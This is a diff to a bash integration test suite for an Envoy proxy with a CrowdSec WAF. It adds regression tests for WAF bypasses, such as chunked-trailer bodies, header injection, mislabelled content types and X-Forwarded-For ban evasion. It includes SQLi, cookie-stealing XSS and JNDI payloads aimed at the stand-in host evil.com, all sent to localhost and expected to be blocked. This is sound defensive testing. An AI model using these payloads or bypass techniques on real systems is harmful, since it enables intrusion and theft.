@@ -4,6 +4,7 @@ set -euo pipefail
 ENVOY_URL="${ENVOY_URL:-http://localhost:8000}"
 ENVOY_ASYNC_URL="${ENVOY_ASYNC_URL:-http://localhost:8001}"
 ENVOY_FAILOPEN_URL="${ENVOY_FAILOPEN_URL:-http://localhost:8002}"
+ENVOY_LAPI_URL="${ENVOY_LAPI_URL:-http://localhost:8003}"
 PASS=0
 FAIL=0
 TOTAL=0
@@ -60,6 +61,58 @@ assert_body() {
         FAIL=$((FAIL + 1))
     fi
     rm -f "$tmp"
+}
+
+# Sends a chunked POST that terminates with a trailer section instead of a final
+# zero-length DATA frame. curl cannot emit trailers, so speak HTTP/1.1 directly.
+#
+# This is the regression guard for the trailer bypass: when a request ends in trailers,
+# Envoy delivers the last body chunk with end_stream=false and signals the end through
+# decodeTrailers, so on_http_request_body never sees end_of_stream. Without an
+# on_http_request_trailers handler the AppSec call was never dispatched at all and the
+# request passed completely uninspected. HTTP/2 trailer frames land on the same filter
+# callback, so this covers that path too.
+assert_trailer_status() {
+    local description="$1"
+    local expected="$2"
+    local body="$3"
+    TOTAL=$((TOTAL + 1))
+
+    local host port
+    host=$(printf '%s' "$ENVOY_URL" | sed -E 's#^https?://([^:/]+).*#\1#')
+    port=$(printf '%s' "$ENVOY_URL" | sed -E 's#^https?://[^:/]+:([0-9]+).*#\1#')
+    [ "$port" = "$ENVOY_URL" ] && port=80
+
+    local status=""
+    if exec 3<>"/dev/tcp/$host/$port" 2>/dev/null; then
+        {
+            printf 'POST /post HTTP/1.1\r\n'
+            printf 'Host: %s\r\n' "$host"
+            printf 'Content-Type: application/x-www-form-urlencoded\r\n'
+            printf 'Transfer-Encoding: chunked\r\n'
+            printf 'Trailer: X-Checksum\r\n'
+            printf 'Connection: close\r\n'
+            printf '\r\n'
+            printf '%x\r\n%s\r\n' "${#body}" "$body"
+            printf '0\r\n'
+            printf 'X-Checksum: deadbeef\r\n'
+            printf '\r\n'
+        } >&3
+        status=$(timeout 20 head -n 1 <&3 2>/dev/null | awk '{print $2}') || true
+        exec 3<&- 3>&- 2>/dev/null || true
+    fi
+
+    if [ "$status" = "$expected" ]; then
+        echo -e "${GREEN}PASS${NC} [$status] $description"
+        PASS=$((PASS + 1))
+    else
+        echo -e "${RED}FAIL${NC} [${status:-no-response} expected $expected] $description"
+        FAIL=$((FAIL + 1))
+    fi
+}
+
+cscli() {
+    docker compose exec -T crowdsec cscli "$@" >/dev/null 2>&1 || true
 }
 
 echo "============================================="
@@ -310,6 +363,81 @@ assert_status "Internal endpoint pow-worker.js reachable" 200 \
 echo ""
 
 # -----------------------------------------------------------
+# WAF bypass regressions
+# -----------------------------------------------------------
+# Each case here passed uninspected before the corresponding fix. They are the reason
+# the fixes exist, so they must stay in the suite.
+echo -e "${YELLOW}=== WAF Bypass Regressions (expect 403) ===${NC}"
+echo ""
+
+# Trailers used to suppress the AppSec dispatch entirely
+assert_trailer_status "SQLi in a chunked body terminated by trailers" 403 \
+    "username=admin' OR 1=1--"
+
+assert_trailer_status "JNDI in a chunked body terminated by trailers" 403 \
+    'input=${jndi:ldap://evil.com/exploit}'
+
+# Only User-Agent and Cookie used to reach AppSec, so every other header was invisible
+assert_status "JNDI in Referer header" 403 \
+    -H 'Referer: http://evil.com/${jndi:ldap://evil.com/a}' \
+    "$ENVOY_URL/get"
+
+assert_status "JNDI in an arbitrary custom header" 403 \
+    -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' \
+    "$ENVOY_URL/get"
+
+# A binary Content-Type used to skip body inspection on the strength of the header alone
+assert_status "SQLi body mislabelled as application/octet-stream" 403 \
+    -X POST "$ENVOY_URL/post" \
+    -H "Content-Type: application/octet-stream" \
+    -d "username=admin' OR 1=1--"
+
+assert_status "XSS body mislabelled as image/png" 403 \
+    -X POST "$ENVOY_URL/post" \
+    -H "Content-Type: image/png" \
+    -d '<script>alert(document.cookie)</script>'
+
+# Bodies on methods outside the old POST/PUT/PATCH allowlist
+assert_status "SQLi in a DELETE body" 403 \
+    -X DELETE "$ENVOY_URL/delete" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "username=admin' OR 1=1--"
+
+assert_status "SQLi in a GET body" 403 \
+    -X GET "$ENVOY_URL/get" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "username=admin' OR 1=1--"
+
+# A client must never be able to speak the AppSec control protocol itself
+assert_status "Client-supplied X-Crowdsec-Appsec-Ip cannot override identity" 403 \
+    -H 'X-Crowdsec-Appsec-Ip: 127.0.0.1' \
+    -H 'X-Crowdsec-Appsec-Api-Key: bogus' \
+    -H 'User-Agent: ${jndi:ldap://evil.com/a}' \
+    "$ENVOY_URL/get"
+
+echo ""
+
+# -----------------------------------------------------------
+# False-positive guards for the content sniff
+# -----------------------------------------------------------
+echo -e "${YELLOW}=== Binary Upload Guards (expect 200) ===${NC}"
+echo ""
+
+# The reason the binary skip exists: real binary uploads must not be scored as text
+printf '\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00\x00\x00\x01' > /tmp/cs-test.png
+dd if=/dev/urandom bs=1k count=32 status=none >> /tmp/cs-test.png
+assert_status "Genuine PNG upload still passes" 200 \
+    -X POST "$ENVOY_URL/post" \
+    -H "Content-Type: image/png" \
+    --data-binary @/tmp/cs-test.png
+rm -f /tmp/cs-test.png
+
+assert_status "HTTP/1.0 request is handled" 200 \
+    --http1.0 "$ENVOY_URL/get"
+
+echo ""
+
+# -----------------------------------------------------------
 # CrowdSec test probe
 # -----------------------------------------------------------
 echo -e "${YELLOW}=== CrowdSec Test Probe ===${NC}"
@@ -323,6 +451,67 @@ assert_status "CrowdSec AppSec test probe (async) (expect 404)" 404 \
 
 assert_status "CrowdSec AppSec test probe (fail_open) (expect 404)" 404 \
     "$ENVOY_FAILOPEN_URL/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl"
+echo ""
+
+# -----------------------------------------------------------
+# LAPI decisions: exact IPs, CIDR ranges, and X-Forwarded-For resolution
+# -----------------------------------------------------------
+# Runs against the envoy-lapi listener, which has LAPI on, AppSec off (so these
+# assertions isolate decision matching) and RFC1918 trusted_ips, so the public
+# addresses below are genuine untrusted hops in the forwarded chain.
+echo -e "${YELLOW}=== LAPI Decisions (IP, Range, XFF) ===${NC}"
+echo ""
+
+echo "Seeding decisions and waiting for the bouncer to sync..."
+cscli decisions delete --all
+cscli decisions add -i 9.9.9.9 -d 2h -t ban -R integration/xff-test
+cscli decisions add -r 9.9.8.0/24 -d 2h -t ban -R integration/range-test
+
+lapi_ready=0
+for i in $(seq 1 60); do
+    if curl -sf -o /dev/null "$ENVOY_LAPI_URL/get" 2>/dev/null; then
+        lapi_ready=1
+        break
+    fi
+    sleep 2
+done
+if [ "$lapi_ready" = "0" ]; then
+    echo -e "${RED}envoy-lapi did not become ready, skipping LAPI assertions.${NC}"
+else
+    # sync_freq is 5s on this listener; allow two ticks
+    sleep 12
+
+    assert_status "Unbanned client passes" 200 \
+        "$ENVOY_LAPI_URL/get"
+
+    assert_status "Banned IP as the rightmost forwarded hop is blocked" 403 \
+        -H "X-Forwarded-For: 9.9.9.9" \
+        "$ENVOY_LAPI_URL/get"
+
+    # Regression for the leftmost-XFF bug: the client controls the left of the chain,
+    # so a banned client could prepend a clean entry and walk straight past its ban.
+    assert_status "Banned client cannot evade by prepending a clean XFF entry" 403 \
+        -H "X-Forwarded-For: 1.1.1.1, 9.9.9.9" \
+        "$ENVOY_LAPI_URL/get"
+
+    # The same bug in the other direction: a spoofed leftmost entry must not be able to
+    # get an innocent client blocked.
+    assert_status "Spoofed leftmost XFF entry does not block an innocent client" 200 \
+        -H "X-Forwarded-For: 9.9.9.9, 8.8.8.8" \
+        "$ENVOY_LAPI_URL/get"
+
+    # Regression for Range-scope decisions, which used to be synced and then never
+    # consulted - community blocklists are largely CIDR, so every one of them was inert.
+    assert_status "IP inside a banned CIDR range is blocked" 403 \
+        -H "X-Forwarded-For: 9.9.8.77" \
+        "$ENVOY_LAPI_URL/get"
+
+    assert_status "IP outside the banned CIDR range passes" 200 \
+        -H "X-Forwarded-For: 9.9.7.77" \
+        "$ENVOY_LAPI_URL/get"
+
+    cscli decisions delete --all
+fi
 echo ""
 
 # -----------------------------------------------------------
